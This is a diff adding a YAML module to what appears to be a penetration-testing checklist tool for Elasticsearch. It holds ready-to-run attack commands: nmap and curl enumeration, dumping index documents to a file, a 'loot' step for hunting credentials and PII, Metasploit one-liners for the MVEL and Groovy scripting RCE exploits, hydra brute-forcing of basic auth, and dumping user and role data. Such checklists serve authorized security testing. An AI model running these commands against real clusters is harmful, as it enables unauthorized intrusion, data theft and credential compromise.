@@ -1,0 +1,75 @@
+module: elastic
+name: Elasticsearch (9200 / 9300)
+inputs: [USERS, PASS, OUT]
+
+sections:
+
+  - id: initial
+    name: Initial Access & Detection
+    steps:
+      - id: version
+        text: Confirm live / version via REST root
+        commands: |
+          nmap -p$PORT -sV -sC $IP
+          curl -s http://$IP:$PORT/
+      - id: auth_check
+        text: Check for anonymous access (no auth = full read)
+        commands: |
+          curl -s http://$IP:$PORT/_cluster/health?pretty
+          curl -s http://$IP:$PORT/_security/_authenticate
+
+  - id: enum
+    name: Index & Data Enumeration
+    steps:
+      - id: indices
+        text: List all indices
+        commands: |
+          curl -s "http://$IP:$PORT/_cat/indices?v"
+          curl -s "http://$IP:$PORT/_aliases?pretty"
+      - id: nodes
+        text: Cluster / node / plugin info
+        commands: |
+          curl -s "http://$IP:$PORT/_nodes?pretty"
+          curl -s "http://$IP:$PORT/_cat/plugins?v"
+      - id: search
+        text: Dump documents from an index
+        commands: |
+          curl -s "http://$IP:$PORT/<index>/_search?pretty&size=100"
+          curl -s "http://$IP:$PORT/_search?pretty&size=1000" -o $OUT/es_dump.json
+      - id: loot
+        text: Hunt credentials / PII in indexed data
+        manual: true
+        commands: |
+          # grep dumped json for password, token, apikey, email
+
+  - id: vuln
+    name: Vulnerability Identification
+    steps:
+      - id: cve_map
+        text: Version to CVE mapping
+        commands: |
+          searchsploit elasticsearch
+      - id: rce_scripts
+        text: Legacy scripting RCE (CVE-2014-3120 MVEL / CVE-2015-1427 Groovy)
+        manual: true
+        commands: |
+          msfconsole -qx "use exploit/multi/elasticsearch/script_mvel_rce; set RHOSTS $IP; set RPORT $PORT; run; exit"
+          msfconsole -qx "use exploit/multi/elasticsearch/search_groovy_script; set RHOSTS $IP; set RPORT $PORT; run; exit"
+
+  - id: creds
+    name: Authentication (X-Pack enabled)
+    authorized: true
+    steps:
+      - id: authed
+        text: Access with credentials
+        commands: |
+          curl -s -u $USER:$PASS "http://$IP:$PORT/_cat/indices?v"
+      - id: brute
+        text: Brute-force basic auth
+        commands: |
+          hydra -L $USERLIST -P $PASSLIST $IP -s $PORT http-get /
+      - id: users
+        text: Dump defined users / roles (if authorized)
+        manual: true
+        commands: |
+          curl -s -u $USER:$PASS "http://$IP:$PORT/_security/user?pretty"
